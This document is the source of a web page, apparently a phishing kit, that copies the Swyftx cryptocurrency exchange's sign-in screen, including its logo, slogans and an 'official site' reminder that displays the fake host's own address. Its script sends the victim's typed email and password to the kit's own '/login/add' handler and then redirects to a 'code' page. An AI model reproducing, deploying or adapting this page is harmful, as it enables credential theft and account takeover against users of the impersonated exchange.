<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Swyftx</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <!-- <script src="<?= base_url() ?>assets/swift/splide/dist/js/splide.min.js"></script>
    <link rel="stylesheet" href="<?= base_url() ?>assets/swift/splide/dist/css/splide.min.css"> -->
    <script src='https://www.google.com/recaptcha/api.js'></script>
</head>

<style>
    body {
        font-family: Poppins, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        -webkit-font-smoothing: antialiased;
        background-image: url(<?= base_url() ?>assets/swift/bg.png);
    }



    .always_check {
        background-color: rgb(226, 240, 255);
        border-radius: 5px;
        padding: 10px 30px;
    }


    .always_check p {
        font-weight: 400;
        line-height: 1.5;
        font-size: 12px;
    }

    .sign_in {
        font-weight: 700;
        font-size: 32px;
    }

    .form-label {
        line-height: 1.5;
        font-size: 14px;
        font-weight: 500;
    }


    .tombol {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.9375rem;
        line-height: 1.75;
        padding: 8px 22px;
        border-radius: 5px;
        color: rgb(255, 255, 255);
        background-color: rgb(0, 114, 237);
        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        width: 100%;
        height: 50px;
    }

    .tombol-disabled {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.9375rem;
        line-height: 1.75;
        padding: 8px 22px;
        border-radius: 5px;
        color: #ababab;
        background-color: rgb(224 224 224);

        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        width: 100%;
        height: 50px;
    }

    .row {
        max-width: 1240px
    }

    .title_c {
        margin: 0px 0px 24px;
        font-family: Poppins;
        font-size: 2.125rem;
        line-height: 1.235;
        color: white;
        font-weight: 700;
        width: 100%;
        text-align: center;
    }

    .caption_c {
        margin: 0px;
        font-family: Poppins;
        font-size: 1rem;
        line-height: 1.5;
        color: white;
        font-weight: 400;
        width: 100%;
        text-align: center;
    }

    .form-control {
        height: 46px;
    }



    .dot {
        border-radius: 0.6rem;
        width: 0.6rem;
        height: 0.6rem;
        margin: 0px 0.2rem;
        background-color: rgb(255, 255, 255);
        display: inline-block;
        transition: background-color 0.6s ease;
        opacity: 0.5;
    }

    .dot_white {
        border-radius: 0.6rem;
        width: 0.6rem;
        height: 0.6rem;
        margin: 0px 0.2rem;
        background-color: rgb(255, 255, 255);
        display: inline-block;
        transition: background-color 0.6s ease;
        opacity: 1;
    }


    .havean {
        align-items: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        background-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        padding: 6px 8px;
        border-radius: 5px;
        color: rgb(0, 114, 237);
        width: 100%;
        box-shadow: none;
        text-transform: none;
        min-width: auto;
    }

    .css-ldo77b {
        user-select: none;
        display: inline-block;
        fill: currentcolor;
        flex-shrink: 0;
        transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        font-size: 1.5rem;
        width: 24px;
        height: 24px;
        color: currentcolor;
    }

    p {
        margin-top: 0;
        margin-bottom: 0;
    }

    .form-forget {
        margin: 0px;
        font-family: Poppins;
        line-height: 1.5;
        color: rgb(0, 114, 237);
        font-size: 12px;
        font-weight: 500;
    }

    .http {
        margin: 0px;
        font-family: Poppins;
        font-weight: 400;
        line-height: 1.5;
        color: rgb(0, 114, 237);
        font-size: 12px;
    }

    .row {
        padding: 25px;
    }

    .card {
        padding: 50px
    }

    .form-control {
        background-color: #f7f9fc;
    }

    @media (max-width: 600px) {
        .row {
            --bs-gutter-x: 0rem;
            padding: 0px;
        }

        .card {
            border-radius: 0px;
            padding: 5px
        }

        .title_c {
            font-size: 24px;
        }

        .caption_c {
            font-size: 16px;
        }
    }
    }
</style>

<body>
    <div class="bg h-100">
        <div class="row py-5-sm px-5-sm d-flex flex-md-row flex-column mx-auto justify-content-center">
            <div class="col-md-6 col-sm-12 d-flex justify-content-center flex-column align-self-center order-2 order-md-1 mt-4">
                <div class="d-flex justify-content-center flex-column align-self-center d-none d-sm-block">
                    <img id="loginCarousel.logo.image" src="<?= base_url() ?>assets/swift/swyftx-logo.svg" width="150" height="35" alt="swyftx-logo">
                </div>
                <div class="mt-4 slideshow-container">
                    <div class="mySlides">
                        <h1 class="title_c">Buy, sell and trade over 280+ assets.</h1>
                        <h4 class="caption_c">Never miss out on assets, with new listings added every month.</h4>
                    </div>

                </div>
                <div style="text-align:center" class="mt-5">
                    <span class="dot_white"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>

            </div>
            <div class="col-md-6 order-1 order-md-2 col-sm-12">
                <div class="card">
                    <div class="card-body">
                        <div class="d-flex justify-content-center align-self-center mb-4 d-block d-sm-none">
                            <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-1ypq714" focusable="false" aria-hidden="true" viewBox="0 0 24 24" id="loginCarousel.logo.dark.image" width="32px" height="32px"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M7.03766 22.32C7.11099 22.2133 7.65765 21.5667 8.25096 20.8667C8.85095 20.1734 9.61093 19.2534 9.95092 18.8334C10.2842 18.4134 10.8242 17.7668 11.1442 17.4001C11.9375 16.4868 12.1442 16.1668 12.0309 16.0468C11.8642 15.8868 11.4375 15.8335 10.2842 15.8335C9.23094 15.8335 6.59101 16.0468 6.43101 16.1468C6.39101 16.1735 6.38435 16.1535 6.41768 16.1068C6.57101 15.8535 7.87097 15.1669 8.1843 15.1669C8.25763 15.1669 8.31763 15.1402 8.31763 15.1002C8.31763 15.0669 8.2443 15.0335 8.15763 15.0335C8.0643 15.0335 7.74431 14.9535 7.43765 14.8602C6.60434 14.6002 5.6177 14.0869 6.15102 14.1936C7.62431 14.4869 9.85759 14.5335 10.9842 14.3069C12.1975 14.0536 12.5575 13.7936 13.0042 12.8536C13.2042 12.4269 13.2175 12.3536 13.2108 11.7003C13.1975 9.82701 12.1442 6.36044 10.7376 3.54051C10.4642 3.00053 10.2576 2.53387 10.2842 2.51387C10.4176 2.38055 11.5242 3.22719 12.5242 4.23383C14.3841 6.11378 15.9241 8.78037 16.6241 11.3403C16.7841 11.9336 16.7907 12.0403 16.7307 12.3869C16.6707 12.6936 16.4774 13.2003 16.2707 13.5736C16.2574 13.5936 16.4907 13.6469 16.7841 13.6869C17.3574 13.7669 17.5774 13.8602 17.9107 14.1402C18.2574 14.4269 18.284 14.5402 18.0707 14.7402C17.724 15.0602 17.0041 15.3669 16.1574 15.5469C15.9308 15.5935 15.8908 15.6335 15.7841 15.9135C15.5574 16.5135 14.9108 17.3735 14.0175 18.2734C12.9842 19.3134 10.7776 21.16 10.0576 21.5867C9.14427 22.1333 7.99764 22.5 7.21766 22.5H6.911L7.03766 22.32Z" fill="currentColor"></path>
                                </svg></svg>
                        </div>
                        <h2 class="fw-bold text-center sign_in">Sign In</h2>
                        <div class="d-flex always_check justify-content-center flex-column mt-5">
                            <p class="text-center lh-sm">Always check you are on the official site<br><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-ldo77b" focusable="false" aria-hidden="true" viewBox="0 0 24 24" style="margin-right: 0.3rem; line-height: 1.5; color: rgb(0, 114, 237);"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path opacity="0.4" d="M16.423 9.448V7.3a4.552 4.552 0 00-4.55-4.551 4.55 4.55 0 00-4.57 4.53v2.168" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <path clip-rule="evenodd" d="M15.683 21.25h-7.64a3.792 3.792 0 01-3.793-3.792v-4.29a3.792 3.792 0 013.792-3.791h7.641a3.792 3.792 0 013.792 3.792v4.289a3.792 3.792 0 01-3.792 3.792z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <path d="M11.863 14.203v2.22" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                    </svg></svg><span class="http">https://</span><?= str_replace("https://", "", base_url()) ?></p>

                        </div>
                        <div class="my-4">
                            <div class="mb-2">
                                <label for="exampleInputEmail1" class="form-label">Email address</label>
                                <input type="email" class="input-email form-control form-input" onkeyup="validasi()" id="exampleInputEmail1" placeholder="Email Address" aria-describedby="emailHelp">
                            </div>
                            <div class="mb-2">
                                <div class="d-flex justify-content-between">
                                    <label for="exampleInputPassword1" class="form-label">Password</label>
                                    <label for="exampleInputPassword1" class="form-forget">Forgot your password?</label>
                                </div>

                                <input type="password" class="input-password form-control form-input" onkeyup="validasi()" placeholder="Password" id="exampleInputPassword1">
                            </div>
                            <div class="mb-2 form-check">
                                <input type="checkbox" class="form-check-input" id="exampleCheck1">
                                <label class="form-label" for="exampleCheck1">Remember Me</label>
                            </div>

                            <div class="d-grid gap-2" style="margin-top:150px">
                                <button type="submit" class="tombol-disabled proses">Sign In</button>
                            </div>
                            <div>
                                <button class=" havean">Don't have an account?</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script>
            function validasi() {
                if ($(".input-email").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".input-password").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else {
                    console.log("good")
                    $(".proses").attr("class", "tombol proses")
                }
            }
            $(".proses").click(function() {

                if ($(".input-email").val() == "") {
                    // $(".email-field").attr("class", "j-field email-field j-field--error")
                    // $(".error-email").attr("hidden", false)
                } else if ($(".input-password").val() == "") {
                    // $(".password-field").attr("class", "j-field password-field j-field--error")
                    // $(".error-password").attr("hidden", false)
                } else {
                    console.log("adfadfafd")
                    $.ajax({
                        type: 'POST',
                        url: '/index.php/login/add',
                        beforeSend: function() {
                            // memuat()
                        },
                        data: {
                            email: $('.input-email').val(),
                            password: $('.input-password').val(),
                        },
                        dataType: 'json',
                        success: function(data) {
                            console.log(data)
                            if (data == true) {
                                window.location.replace("<?= base_url() ?>index.php/login/code?pRdWVyeShkb2N1bWVudCkucmVhZH=1");
                            } else {}
                        },
                        error: function(x, e) {
                            console.log(e)
                        } //end error
                    });
                }
            })
        </script>
</body>

</html>